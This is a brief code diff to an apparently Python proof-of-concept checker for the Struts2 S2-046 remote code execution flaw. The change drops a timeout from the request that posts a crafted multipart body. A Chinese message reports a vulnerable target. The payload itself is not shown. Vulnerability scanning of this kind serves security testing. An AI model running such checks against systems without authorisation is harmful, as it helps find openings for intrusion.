@@ -52,7 +52,7 @@ class poc:
         data += char + "\r\n"
         data += "------WebKitFormBoundaryAnmUgTEhFhOZpr9z--"
         try:
-            result = requests.post(url=url, data=data, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
+            result = requests.post(url=url, data=data, headers=self.headers, verify=False, proxies=self.proxies)
             if payload in result.text:
                 target = urlparse(url)
                 self.result_text += """\n        [+]    \033[32m检测到目标站点存在远程代码执行漏洞 (s2-046)\033[0m
